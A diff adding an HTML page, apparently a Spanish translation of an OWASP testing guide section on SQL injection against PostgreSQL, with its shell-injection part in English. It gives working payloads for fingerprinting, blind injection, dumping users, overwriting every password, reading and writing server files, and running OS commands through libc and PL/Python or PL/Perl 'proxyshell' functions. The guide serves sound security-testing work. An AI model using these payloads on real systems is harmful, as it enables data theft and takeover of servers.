@@ -1,0 +1,160 @@
+<h1 id="postgresql">PostgreSQL</h1>
+<h2 id="summary">Resumen</h2>
+<p>En esta sección se tratarán algunas técnicas de inyección SQL para PostgreSQL. Estas técnicas tienen las siguientes características:</p>
+<ul>
+<li>El conector de PHP permite ejecutar varias sentencias usando <code>;</code> como separador de sentencias</li>
+<li>Las sentencias SQL pueden truncarse añadiendo el carácter de comentario: <code>--</code>.</li>
+<li><code>LIMIT</code> y <code>OFFSET</code> pueden usarse en una sentencia <code>SELECT</code> para recuperar una porción del conjunto de resultados generado por la <code>query</code></li>
+</ul>
+<p>De ahora en adelante se supone que <code>https://www.example.com/news.php?id=1</code> es vulnerable a ataques de inyección SQL.</p>
+<h2 id="how-to-test">Cómo probar</h2>
+<h3 id="identifying-postgresql">Identificación de PostgreSQL</h3>
+<p>Cuando se ha encontrado una inyección SQL, es necesario identificar con cuidado el motor de la base de datos de backend. Se puede determinar que el motor de base de datos de backend es PostgreSQL usando el operador de conversión (cast) <em>::</em>.</p>
+<h4 id="examples">Ejemplos</h4>
+<p><code>https://www.example.com/store.php?id=1 AND 1::int=1</code></p>
+<p>Además, la función <em>version()</em> puede usarse para obtener el banner de PostgreSQL. Esto también mostrará el tipo y la versión del sistema operativo subyacente.</p>
+<h5 id="example">Ejemplo</h5>
+<p><code>https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--</code></p>
+<p>Un ejemplo de cadena de banner que podría devolverse es:</p>
+<p><code>PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)</code></p>
+<h3 id="blind-injection">Inyección ciega</h3>
+<p>Para los ataques de inyección SQL ciega, se deben tener en cuenta las siguientes funciones integradas:</p>
+<ul>
+<li><p>Longitud de una cadena
+<code>LENGTH(str)</code></p>
+</li>
+<li><p>Extraer una subcadena de una cadena dada
+<code>SUBSTR(str,index,offset)</code></p>
+</li>
+<li><p>Representación de una cadena sin comillas simples
+<code>CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)</code></p>
+</li>
+</ul>
+<p>A partir de la versión 8.2, PostgreSQL introdujo una función integrada, <code>pg_sleep(n)</code>, para hacer que el proceso de la sesión actual duerma durante <code>n</code> segundos. Esta función puede aprovecharse para ejecutar ataques de temporización (tratados en detalle en <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection" target="_blank" rel="noopener">Blind SQL Injection</a>).</p>
+<p>Además, se puede crear fácilmente un <code>pg_sleep(n)</code> personalizado en versiones anteriores usando libc:</p>
+<ul>
+<li><code>CREATE function pg_sleep(int) RETURNS int AS &#39;/lib/libc.so.6&#39;, &#39;sleep&#39; LANGUAGE &#39;C&#39; STRICT</code></li>
+</ul>
+<h3 id="single-quote-unescape">Eliminación de escape de comillas simples</h3>
+<p>Las cadenas pueden codificarse, para evitar el escape de las comillas simples, usando la función <code>chr()</code>.</p>
+<ul>
+<li><code>chr(n)</code>: devuelve el carácter cuyo valor ASCII corresponde al número <code>n</code></li>
+<li><code>ascii(n)</code>: devuelve el valor ASCII que corresponde al carácter <code>n</code></li>
+</ul>
+<p>Supongamos que se quiere codificar la cadena &#39;root&#39;:</p>
+<pre><code class="language-sql">select ascii(&#39;r&#39;)
+114
+select ascii(&#39;o&#39;)
+111
+select ascii(&#39;t&#39;)
+116
+</code></pre>
+<p>Podemos codificar &#39;root&#39; como:</p>
+<p><code>chr(114)||chr(111)||chr(111)||chr(116)</code></p>
+<h4 id="example-1">Ejemplo</h4>
+<p><code>https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--</code></p>
+<h3 id="attack-vectors">Vectores de ataque</h3>
+<h4 id="current-user">Usuario actual</h4>
+<p>La identidad del usuario actual puede obtenerse con las siguientes sentencias SQL SELECT:</p>
+<pre><code class="language-sql">SELECT user
+SELECT current_user
+SELECT session_user
+SELECT usename FROM pg_user
+SELECT getpgusername()
+</code></pre>
+<h5 id="example-2">Ejemplo</h5>
+<pre><code class="language-text">https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
+https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
+</code></pre>
+<h4 id="current-database">Base de datos actual</h4>
+<p>La función integrada current_database() devuelve el nombre de la base de datos actual.</p>
+<h5 id="example-3">Ejemplo</h5>
+<p><code>https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--</code></p>
+<h4 id="reading-from-a-file">Lectura de un archivo</h4>
+<p>PostgreSQL ofrece dos formas de acceder a un archivo local:</p>
+<ul>
+<li>Sentencia <code>COPY</code></li>
+<li>Función interna <code>pg_read_file()</code> (a partir de PostgreSQL 8.1)</li>
+</ul>
+<h5 id="copy">COPY</h5>
+<p>Este operador copia datos entre un archivo y una tabla. El motor de PostgreSQL accede al sistema de archivos local como el usuario <code>postgres</code>.</p>
+<h6 id="example-4">Ejemplo</h6>
+<pre><code class="language-text">/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
+/store.php?id=1; COPY file_store(data) FROM &#39;/var/lib/postgresql/.psql_history&#39;--
+</code></pre>
+<p>Los datos deben recuperarse mediante una <code>UNION Query SQL Injection</code>:</p>
+<ul>
+<li>recupera el número de filas añadidas previamente en <code>file_store</code> con la sentencia <code>COPY</code></li>
+<li>recupera una fila a la vez con inyección SQL UNION</li>
+</ul>
+<pre><code class="language-text">/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
+...
+...
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
+</code></pre>
+<h5 id="pgreadfile">pg_read_file()</h5>
+<p>Esta función se introdujo en <code>PostgreSQL 8.1</code> y permite leer archivos arbitrarios ubicados dentro del directorio de datos del DBMS.</p>
+<h6 id="example-5">Ejemplo</h6>
+<p><code>SELECT pg_read_file(&#39;server.key&#39;,0,1000);</code></p>
+<h4 id="writing-to-a-file">Escritura en un archivo</h4>
+<p>Invirtiendo la sentencia COPY, podemos escribir en el sistema de archivos local con los derechos del usuario <code>postgres</code></p>
+<p><code>/store.php?id=1; COPY file_store(data) TO &#39;/var/lib/postgresql/copy_output&#39;--</code></p>
+<h4 id="shell-injection">Shell Injection</h4>
+<blockquote>
+<p>Nota: esta subsección se muestra en su versión original en inglés.</p>
+</blockquote>
+<p>PostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.</p>
+<h5 id="dynamic-library">Dynamic Library</h5>
+<p>Until PostgreSQL 8.1, it was possible to add a custom function linked with <code>libc</code>:</p>
+<p><code>CREATE FUNCTION system(cstring) RETURNS int AS &#39;/lib/libc.so.6&#39;, &#39;system&#39; LANGUAGE &#39;C&#39; STRICT</code></p>
+<p>Since <code>system</code> returns an <code>int</code> how we can fetch results from <code>system</code> stdout?</p>
+<p>Here&#39;s a little trick:</p>
+<ul>
+<li>create a <code>stdout</code> table: <code>CREATE TABLE stdout(id serial, system_out text)</code></li>
+<li>executing a shell command redirecting its <code>stdout</code>: <code>SELECT system(&#39;uname -a &gt; /tmp/test&#39;)</code></li>
+<li>use a <code>COPY</code> statements to push output of previous command in <code>stdout</code> table: <code>COPY stdout(system_out) FROM &#39;/tmp/test*&#39;</code></li>
+<li>retrieve output from <code>stdout</code>: <code>SELECT system_out FROM stdout</code></li>
+</ul>
+<h6 id="example-6">Example</h6>
+<pre><code class="language-text">/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
+/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS &#39;/lib/libc.so.6&#39;,&#39;system&#39; LANGUAGE &#39;C&#39;
+STRICT --
+/store.php?id=1; SELECT system(&#39;uname -a &gt; /tmp/test&#39;) --
+/store.php?id=1; COPY stdout(system_out) FROM &#39;/tmp/test&#39; --
+/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
+</code></pre>
+<h5 id="plpython">Plpython</h5>
+<p>PL/Python allows users to code PostgreSQL functions in python. It&#39;s untrusted so there is no way to restrict what user can do. It&#39;s not installed by default and can be enabled on a given database by <code>CREATELANG</code></p>
+<ul>
+<li>Check if PL/Python has been enabled on a database: <code>SELECT count(*) FROM pg_language WHERE lanname=&#39;plpythonu&#39;</code></li>
+<li>If not, try to enable: <code>CREATE LANGUAGE plpythonu</code></li>
+<li>If either of the above succeeded, create a proxy shell function: <code>CREATE FUNCTION proxyshell(text) RETURNS text AS &#39;import os; return os.popen(args[0]).read() &#39;LANGUAGE plpythonu</code></li>
+<li>Have fun with: <code>SELECT proxyshell(os command);</code></li>
+</ul>
+<h6 id="example-7">Example</h6>
+<ul>
+<li>Create a proxy shell function: <code>/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--</code></li>
+<li>Run an OS Command: <code>/store.php?id=1 UNION ALL SELECT NULL, proxyshell(&#39;whoami&#39;), NULL OFFSET 1;--</code></li>
+</ul>
+<h5 id="plperl">Plperl</h5>
+<p>Plperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as <code>open</code>. By doing so, it&#39;s impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the <code>postgres</code> user, to avoid the so-called application mask filtering of trusted/untrusted operations.</p>
+<ul>
+<li>Check if PL/perl-untrusted has been enabled: <code>SELECT count(*) FROM pg_language WHERE lanname=&#39;plperlu&#39;</code></li>
+<li>If not, assuming that sysadm has already installed the plperl package, try: <code>CREATE LANGUAGE plperlu</code></li>
+<li>If either of the above succeeded, create a proxy shell function: <code>CREATE FUNCTION proxyshell(text) RETURNS text AS &#39;open(FD,&quot;$_[0] |&quot;);return join(&quot;&quot;,&lt;FD&gt;);&#39; LANGUAGE plperlu</code></li>
+<li>Have fun with: <code>SELECT proxyshell(os command);</code></li>
+</ul>
+<h6 id="example-8">Example</h6>
+<ul>
+<li>Create a proxy shell function: <code>/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS &#39;open(FD,&quot;$_[0] |&quot;);return join(&quot;&quot;,&lt;FD&gt;);&#39; LANGUAGE plperlu;</code></li>
+<li>Run an OS Command: <code>/store.php?id=1 UNION ALL SELECT NULL, proxyshell(&#39;whoami&#39;), NULL OFFSET 1;--</code></li>
+</ul>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="#/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection">SQL Injection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">SQL Injection Prevention Cheat Sheet</a></li>
+<li><a href="https://www.postgresql.org/docs/" target="_blank" rel="noopener">PostgreSQL Official Documentation</a></li>
+<li><a href="https://sqlmap.org/" target="_blank" rel="noopener">Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool</a></li>
+</ul>
